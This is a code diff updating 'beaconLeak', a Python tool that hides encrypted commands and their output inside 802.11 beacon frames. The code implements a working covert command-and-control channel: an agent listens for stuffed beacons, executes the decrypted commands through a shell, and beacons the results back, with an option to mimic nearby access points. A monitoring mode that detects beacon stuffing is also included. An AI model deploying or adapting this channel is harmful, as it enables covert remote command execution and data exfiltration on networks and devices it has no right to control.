@@ -5,10 +5,11 @@
 | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
 | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
 |___|___|__,|___|___|_|_|_____|___|__,|_,_|
-                        by cjcase [v0.8.50]
+                        by cjcase [v0.8.55]
 
 beaconLeak - Covert data exfiltration and detection using beacon stuffing (🥓)
 """
+import sys
 import time
 import shlex
 import subprocess
@@ -40,7 +41,8 @@ class beaconleak():
         self.covert_frame = None
         self.beacons = {}
         # IEEE Std 802.11™-2016. Table 9-77, Element IDs. p.784-790
-        self.reserved = [2, 8, 9] + [*range(17,32)] + [47, 49, 128, 129] + [*range(133, 137)] + [149, 150, 155, 156, 173, 176] + [*range(178, 181)] + [203] + [*range(207,221)] + [*range(222, 255)]
+        # Wireshark acknowledges Tag ID 47 as ERP Information
+        self.reserved = [2, 8, 9] + [*range(17,32)] + [49, 128, 129] + [*range(133, 137)] + [149, 150, 155, 156, 173, 176] + [*range(178, 181)] + [203] + [*range(207,221)] + [*range(222, 255)]
         # c2 commands
         self.shell_cmds = {
             '!help': 'print these commands',
@@ -68,8 +70,11 @@ class beaconleak():
             self.bssid = '00:14:bf:de:ad:c0'
 
     def cmd(self, cmd):
-        args = shlex.split(cmd)
-        result = subprocess.check_output(args)
+        if sys.platform == 'linux':
+            args = shlex.split(cmd)
+            result = subprocess.check_output(args)
+        else:
+            result = subprocess.check_output(cmd, shell=True)
         return result
 
     def beacon_craft(self, msg):
@@ -109,67 +114,71 @@ class beaconleak():
         
     def push_cmd(self, cmd, reply=True):
         # TODO: implement leak mode with extra measurements
-        if self.debug:
-            print("[d] command: {}".format(cmd))
-        msg = cmd.encode()
-        msg_e = self.box.encrypt(msg)
-        if self.debug:
-            print("[d] encrypted: {}".format(msg_e.hex()))
+        try:
+            if self.debug:
+                print("[d] command: {}".format(cmd))
+            msg = cmd.encode()
+            msg_e = self.box.encrypt(msg)
+            if self.debug:
+                print("[d] encrypted: {}".format(msg_e.hex()))
 
-        # craft the frame
-        frame = self.beacon_craft(msg_e)
+            # craft the frame
+            frame = self.beacon_craft(msg_e)
 
-        # TODO: optional bpf filtering
-        # bpf = 'wlan addr2 %s' % bssid
-        if self.debug:
-            print("[d] scapy frame:\n{}".format(frame.command()))
-            # print("[d] sniff filter:\n{}".format(bpf))
-        sendp(frame, iface=self.iface, inter=0.100, loop=0, verbose=int(self.debug))
-        if reply:
-            sniff(iface=self.iface, stop_filter=self.response, timeout=self.delay)
+            # TODO: optional bpf filtering
+            # bpf = 'wlan addr2 %s' % bssid
+            if self.debug:
+                print("[d] scapy frame:\n{}".format(frame.command()))
+                # print("[d] sniff filter:\n{}".format(bpf))
+            sendp(frame, iface=self.iface, inter=0.100, loop=0, verbose=int(self.debug))
+            if reply:
+                sniff(iface=self.iface, stop_filter=self.response, timeout=self.delay)
+        except Exception as e:
+            if self.debug:
+                print("[d] error:\n{}".format(str(e)))
 
     def c2(self):
-        iface = self.iface
         # covert mode
         if self.covert and not self.covert_frame:
             self.sneaky()
-        print("[*] Using interface %s, type '!help' for usage, use Ctrl+C to exit" % iface)
-        while True:
-            try:
-                # TODO: nice-to-have: color output to terminal (interoperable)
-                cmd = input("[beaconshell] >>> ") 
-            except KeyboardInterrupt:
-                print("\n[*] Done!")
-                break
-            except Exception as e:
-                print("[e] Something failed: " + str(e))
-                continue
-            if cmd == '':
-                continue
-            # TODO: implement interactive commands for extra c2 functions
-            if cmd == '!help':
-                for c, desc in self.shell_cmds.items():
-                    print("\t{}: {}".format(c, desc))
-                print()
-            elif cmd[0] == '!':
-                cmd = cmd[1:]
+        print("[*] Using interface {}, type '!help' for usage, use Ctrl+C to exit".format(self.iface))
+        if self.check_iface():
+            while True:
                 try:
-                    cmd = cmd.split()
-                    if cmd[0] == 'download':
-                        # TODO download flow
-                        pass
-                    elif cmd[0] == 'end':
-                        print("\n[*] Done!")
-                        break
+                    # TODO: nice-to-have: color output to terminal (interoperable)
+                    cmd = input("[beaconshell] >>> ") 
+                except KeyboardInterrupt:
+                    print("\n[*] Done!")
+                    break
+                except Exception as e:
+                    print("[e] Something failed: " + str(e))
+                    continue
+                if cmd == '':
+                    continue
+                # TODO: implement interactive commands for extra c2 functions
+                try:
+                    if cmd == '!help':
+                        for c, desc in self.shell_cmds.items():
+                            print("\t{}: {}".format(c, desc))
+                        print()
+                    elif cmd[0] == '!':
+                        cmd = cmd[1:]                    
+                        cmd = cmd.split()
+                        if cmd[0] == 'download':
+                            # TODO download flow
+                            pass
+                        elif cmd[0] == 'end':
+                            print("\n[*] Done!")
+                            break
+                        else:
+                            self.push_cmd(" ".join(cmd), reply=False)
                     else:
-                        self.push_cmd(" ".join(cmd), reply=False)
+                        self.push_cmd(cmd)
                 except Exception as e:
                     print("error in command!")
                     if self.debug:
                         print(str(e))
                     continue
-            else:
-                self.push_cmd(cmd)
 
 
     def response(self, frame):
@@ -189,58 +198,85 @@ class beaconleak():
                         print("[d] error:\n" + str(e))
                 return True
 
+
+    def dec_payload(self, enc):
+        c = ''
+        if self.debug:
+            print("[d] received:{}".format(enc.hex()))
+        try:
+            c = self.box.decrypt(enc)
+            if self.debug:
+                print("[d] decrypted: {}".format(c.decode('utf-8')))
+        except Exception as e:
+            if self.debug:
+                print("[e] Could not decrypt, wrong PSK or error in received beacon!")
+                print("[e] " + str(e))
+        return c
+
+
+    def do_magic(self, frame, cut):
+        if self.debug:
+            print("[d] stuffed beacon at element in position {}:\n{}".format(cut, frame.command()))
+        crypted = frame[Dot11Elt][cut].info
+        c = self.dec_payload(crypted)
+        if c:
+            try:
+                result = self.cmd(c.decode('utf-8'))
+            except Exception as e:
+                result = b"[e] Command failed"
+                if self.debug:
+                    print("[d] Command Failed:\n" + str(e))
+            if self.debug:
+                print("[d] Command Result:\n{}".format(result.decode('utf-8')))
+            result_e = self.box.encrypt(result)
+            frame[Dot11Elt][cut] = Dot11Elt(ID=128, info=b'\x01', len=1) / Dot11Elt(ID=254, info=result_e, len=len(result_e)) / Dot11Elt(ID=255, info=b'\x01\x01\x01\x01', len=4)
+            if self.debug:
+                print("[d] sending:{}".format(result_e.hex()))
+                print("[d] response frame:\n{}".format(frame.command()))
+            time.sleep(2)
+            sendp(frame, iface=self.iface, verbose=int(self.debug))
+
+
     def magic(self, frame):
         # TODO: implement covert logic
-        if frame.haslayer(Dot11Elt):
-            # TODO: redo target logic using new implemented detection method
+        if frame.haslayer(Dot11Beacon):
             if frame.addr2 == self.bssid and frame[Dot11Elt][3].ID == 253:
-                crypted = frame[Dot11Elt][4].info
-                if self.debug:
-                    print("[d] received:{}".format(crypted.hex()))
-                cmd = ''
-                try:
-                    cmd = self.box.decrypt(crypted)
-                except Exception as e:
-                    if self.debug:
-                        print("[e] Could not decrypt, wrong PSK or error in received beacon!")
-                        print("[e] " + str(e))
-                if cmd:
-                    try:
-                        result = self.cmd(cmd.decode('utf-8'))
-                    except Exception as e:
-                        result=b"[e] Command failed"
-                        if self.debug:
-                            print("[d] Command Failed:\n" + str(e))
-                    if self.debug:
-                        print("[d] Command Result:\n{}".format(result.decode('utf-8')))
-                    result_e = self.box.encrypt(result)
-                    frame[Dot11Elt][3] = Dot11Elt(ID=128, info=b'\x01', len=1) / Dot11Elt(ID=254, info=result_e, len=len(result_e)) / Dot11Elt(ID=255, info=b'\x01\x01\x01\x01', len=4)
-                    if self.debug:
-                        print("[d] sending:{}".format(result_e.hex()))
-                        print("[d] response frame:\n{}".format(frame.command()))
-                    time.sleep(2)
-                    sendp(frame, iface=self.iface, verbose=int(self.debug))
-                else:
-                    #command not received correctly or fake
-                    pass
+                self.do_magic(frame, 3)
             else:
-                # covert case here
-                pass
+                i = 0
+                elements = frame
+                while elements:
+                    if elements.ID == 128:
+                        break
+                    if elements.ID == 254:
+                        self.do_magic(frame, i)
+                        break
+                    i = i + 1
+                    elements = elements.payload
+               
 
     def sniff(self, pcap=False):
         iface = self.iface
         try:
             if self.mode == "leak":
-                sniff(iface=iface, prn=self.magic)
+                if self.debug:
+                    print("[*] Starting command listener in debug mode")
+                sniff(iface=iface, prn=self.magic, monitor=True)
             elif self.mode == "mon":
                 if pcap:
                     print("[*] Starting offline capture analysis")
                     sniff(offline=pcap, prn=self.detect)
                 else:
-                    print("[*] Starting live monitoring mode")
-                    sniff(iface=iface, prn=self.detect)
-        except OSError as e:
-                print("[e] interface {} not found, maybe you meant {}mon?".format(iface,iface))
+                    print("[*] Starting live monitoring mode, press Ctrl+C to stop...")
+                    sniff(iface=iface, prn=self.detect, monitor=True)
+        except KeyboardInterrupt:
+            print("\n[*] Done!")
+        except Exception as e:
+            print("[e] Error occurred while sniffing.")
+            if self.debug:
+                print("[d] error: {}".format(str(e)))
+        
+
 
     def clone(self, frame):
         if frame.haslayer(Dot11Beacon):
@@ -292,7 +328,6 @@ class beaconleak():
             #    print(frame.command())
             while elements:
                 if elements.ID in self.reserved:
-                    # some beacon stuffing was found in the wild for elemnt 47, investigate further
                     # TODO: implement syslog functionality for IoCs
                     print("[!] BEACON STUFFING DETECTED (SSID:{} Reserved Element {})".format(frame[Dot11Beacon].info.decode('utf-8'), elements.ID))
                     self.detected += 1
@@ -301,15 +336,25 @@ class beaconleak():
                 elements = elements.payload.getlayer(Dot11Elt)
 
 
+    def check_iface(self):
+        try:
+            sniff(iface=self.iface, count=1, monitor=True)
+        except OSError:
+            print("[e] interface {i} not found, did you mean {i}mon?".format(i=self.iface))
+            return False
+        except Exception:
+            return False
+        return True
+
+
 if __name__ == '__main__':
     import argparse
-    import sys
     banner = """
      _                       __            _
     | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
     | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
     |___|___|__,|___|___|_|_|_____|___|__,|_,_|
-                            by cjcase [v0.8.50]\n
+                            by cjcase [v0.8.55]\n
     """
     parse = argparse.ArgumentParser(add_help=True, formatter_class=argparse.RawTextHelpFormatter, description=banner)
     modes = parse.add_argument_group('modes')
@@ -331,6 +376,7 @@ if __name__ == '__main__':
     )
     optional_arguments = {
         '--covert': 'Hide in plain sight by mimicking surrounding beacons',
+        '--autohop': '(Linux only) Automatic channel hop for detection mode',
         '--debug': 'Debug verbosity.',
     }
     for arg, txt in optional_arguments.items():
@@ -362,6 +408,8 @@ if __name__ == '__main__':
 
     # leak mode
     if args.leak:
+        if args.debug:
+            print(banner)
         bl = beaconleak('leak', args.iface, psk=args.psk, debug=args.debug)
         bl.sniff()
     # c2 mode
@@ -383,4 +431,11 @@ if __name__ == '__main__':
     elif args.mon:
         bl = beaconleak('mon', args.iface, debug=args.debug)
         print(banner)
+        # linux auto hop
+        if args.autohop:
+            if sys.platform == 'linux':
+                print("[i] channel auto-hop enabled, detection accuracy might decrease")
+                # TODO implement subprocess fork to iterate through channels
+            else:
+                print("[i] channel auto-hop is not supported on {}".format(sys.platform))
         bl.sniff(pcap=args.pcap)
